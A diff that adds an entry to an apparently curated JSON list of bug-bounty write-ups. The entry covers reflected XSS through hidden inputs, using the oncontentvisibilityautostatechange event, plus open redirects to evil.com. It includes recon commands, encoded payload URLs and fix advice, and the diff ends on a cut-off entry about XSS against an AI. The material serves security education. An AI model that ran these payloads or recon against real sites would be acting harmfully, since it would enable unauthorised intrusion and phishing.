@@ -1,5 +1,46 @@
 [
   {
+    "id": "b06a4ec27658",
+    "title": "6 Hours = 25 Reflected XSS and 2 Open Redirects",
+    "url": "https://medium.com/@belalmohamed3690/6-hours-25-reflected-xss-and-2-open-redirects-0c3da54f1c0b",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "belo"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-20T18:11:36.000Z",
+    "added_at": "2026-10-21T20:54:21.111Z",
+    "categories": [
+      "xss",
+      "other"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "Reflected XSS in hidden input fields and an open‑redirect on free.palestine.com allow arbitrary JavaScript execution and URL redirection to attacker‑controlled sites.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The page reflects the value of the ck parameter into a hidden <input> without any sanitisation, so an attacker can inject malicious attributes. Because the input is hidden it never receives focus, so classic onfocus or autofocus payloads fail, but the new oncontentvisibilityautostatechange event fires when the element becomes visible. The redirect parameter of the /sso/ endpoint is taken and appended to a Location header without validation, enabling open‑redirect attacks.",
+      "walkthrough": "RECON\nStep 1: Enumerate subdomains of the target.\nCommand: subfinder -all -silent -d target.com >> subs.txt\nWhy: subfinder sends DNS queries (network look‑ups) to discover hostnames under the target domain.\nStep 2: Run findomain and assetfinder to add more subdomains.\nCommands: findomain -t target.com -q >> subs.txt\nassetfinder --subs-only target.com >> subs.txt\nWhy: each tool uses different data sources, increasing coverage.\nStep 3: Deduplicate and check which subdomains are alive.\nCommand: sort -u subs.txt | httpx -silent -threads 50 -rate-limit 150 -timeout 10 > live.txt\nWhy: httpx sends HTTP HEAD requests (lightweight checks) to see if a host responds.\n\nURL COLLECTION\nStep 4: Crawl live hosts for URLs.\nCommand: cat live.txt | katana -silent -jc -d 5 > urls.txt\nWhy: katana follows links (HTTP GET) and records every endpoint it finds.\nStep 5: Pull historic URLs from archives.\nCommand: cat subs.txt | gau --threads 50 --providers wayback,otx,urlscan,commoncrawl >> urls.txt\nWhy: gau queries public archives (Wayback, Common Crawl) for older URLs.\nStep 6: Remove near‑duplicate URLs.\nCommand: sort -u urls.txt | uro > urls_clean.txt\nWhy: uro normalises query strings so identical pages aren’t processed twice.\n\nPARAMETER DISCOVERY\nStep 7: Keep only URLs that contain a query string.\nCommand: grep -a '\\?' urls_clean.txt | sort -u > params.txt\nWhy: the ‘?’ character separates the path from parameters in an HTTP request.\nStep 8: Feed the list to kxss to find reflected parameters.\nCommand: kxss < params.txt | grep -iE \"Unfiltered:.*[\\\"'<>]\"\nWhy: kxss sends crafted requests and looks for the raw characters <, >, \", ', which indicate no filtering.\n\nMANUAL ANALYSIS & EXPLOIT\nStep 9: Identify a vulnerable endpoint with a hidden input.\nExample URL: https://free.palestine.com/PINS001_DAB4F_ENS?ck=HERE\nWhy: the server reflects the value of ck into <input type=\"hidden\" value=\"HERE\">.\nStep 10: Craft a payload that uses the oncontentvisibilityautostatechange event.\nPayload: <input type=\"hidden\" value=\"\" oncontentvisibilityautostatechange=\"alert('hacked by belo')\" style=\"content-visibility:auto\" x=\"\">\nWhy: the attribute fires when the element becomes visible; the alert() call executes JavaScript (alert shows a pop‑up, proving code execution).\nStep 11: Send the payload via the ck parameter.\nFull request URL: https://free.palestine.com/PINS001_DAB4F_ENS?ck=%3Cinput%20type%3D%22hidden%22%20value%3D%22%22%20oncontentvisibilityautostatechange%3D%22alert('hacked%20by%20belo')%22%20style%3D%22content-visibility:auto%22%20x%3D%22%22%3E\nWhy: URL‑encoding (%3C etc.) ensures the browser receives the raw ‘<’ and ‘>’ characters.\nStep 12: Verify the alert pops up in Chrome (the event is Chrome‑only).\nWhy: the vulnerability is browser‑specific because the event is only implemented in Chrome.\n\nPATTERN BRUTE‑FORCING FOR MORE XSS\nStep 13: Observe the endpoint pattern {PREFIX}{NNN}_DA{CODE}_ENS.\nWhy: the three prefixes (PINS, PROA, PROP) and a three‑character code repeat across many pages.\nStep 14: Build wordlists for prefixes, numbers (000‑999) and codes, then run ffuf in cluster‑bomb mode.\nCommand: ffuf -w known1.txt:PFX -w nums.txt:NUM -w known2.txt:LET -u \"https://free.palestine.com/PFXNUM_DALET_ENS?ck=HERE\" -ac\nWhy: ffuf substitutes each placeholder with every entry from the corresponding list, discovering all reachable URLs.\nStep 15: Run the hidden‑input payload against each discovered URL to confirm additional XSS.\nWhy: automation scales the manual step.\n\nOPEN REDIRECT\nStep 16: Find a URL that reflects a redirect parameter.\nExample: https://free.palestine.com/sso/?redirect=https%3A%2F%2Fevil.com\nWhy: the server takes the value and issues a HTTP 302 redirect to it without validation.\nStep 17: Test the same parameter on a similar subdomain.\nExample: https://free-preprod.palestine.com/sso/?redirect=https%3A%2F%2Fevil.com\nWhy: confirms the issue is not isolated.\nStep 18: Verify the browser is sent to evil.com after the request.\nWhy: successful open‑redirect can be used for phishing or to bypass URL‑based filters.",
+      "example": "Example target: https://target.example/app?msg=PLACEHOLDER\nVulnerable code (fictional): <input type=\"hidden\" value=\"{{msg}}\">\nAttack payload: <input type=\"hidden\" value=\"\" oncontentvisibilityautostatechange=\"alert('demo')\" style=\"content-visibility:auto\">\nFull request: https://target.example/app?msg=%3Cinput%20type%3D%22hidden%22%20value%3D%22%22%20oncontentvisibilityautostatechange%3D%22alert('demo')%22%20style%3D%22content-visibility:auto%22%3E\nWhy it works: the server injects the raw msg parameter into a hidden input; the custom event fires when the element becomes visible, executing the alert().",
+      "takeaway": "When hunting for reflected XSS, always look for hidden inputs that echo parameters, because they bypass typical focus‑based filters. Use tools like kxss to spot unfiltered characters, then try newer DOM events (e.g., oncontentvisibilityautostatechange) that may fire without user interaction. Pattern‑based endpoints (PREFIX+NUM+CODE) are a gold mine – brute‑force them with ffuf or similar. Open‑redirects often appear on SSO or login pages; test any URL‑parameter that is later used in a Location header. Variants include using onload, onerror on invisible images, or abusing CSS content‑visibility in other browsers. Beginners should avoid assuming only classic events work; modern browsers add many hidden triggers.",
+      "fix": "Sanitise any user‑controlled value before inserting it into HTML. For hidden inputs, HTML‑encode characters like <, >, \", and ' (e.g., replace < with &lt;). Implement a Content Security Policy that disallows inline scripts and unknown event handlers. For the redirect parameter, enforce a whitelist of allowed domains or use relative paths only, and reject or rewrite URLs that point outside the trusted domain. Updated code snippet (pseudo‑PHP):\n$ck = htmlspecialchars($_GET['ck'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');\necho \"<input type='hidden' value='$ck'>\";\n$dest = $_GET['redirect'];\n$allowed = ['https://free.palestine.com','https://free-preprod.palestine.com'];\nif (in_array($dest, $allowed)) { header(\"Location: $dest\"); } else { echo 'Invalid redirect'; }",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "Like my friend Mohamed Abdelmoatie (3at3ot) said, there are two types of bug hunting: * Type 1: big scope, recon, fuzzing and injections (RXSS and SQLi) * Type 2: small scope, logic , authentication and access control bugs Even though I prefer type 2, this write-up is the type 1 and I found 27 bugs from it. Let’s dive into the methodology Press enter or click to view image in full size Image 3 ## From 0 to 6 Bugs (6 XSS) _Note: this recon stage was automated , this program is VDP and the domains mentioned arn’t real_ Bug hunting 101: subdomain enum. Three tools into one pile, then keep whateve",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "db09904445b7",
     "title": "XSS by Proxy: “Tricking the AI Into Reading Its Own Death Sentence Out Loud 🤖📋”",
     "url": "https://meetcyber.net/xss-by-proxy-tricking-the-ai-into-reading-its-own-death-sentence-out-loud-2ae1811a4f88",
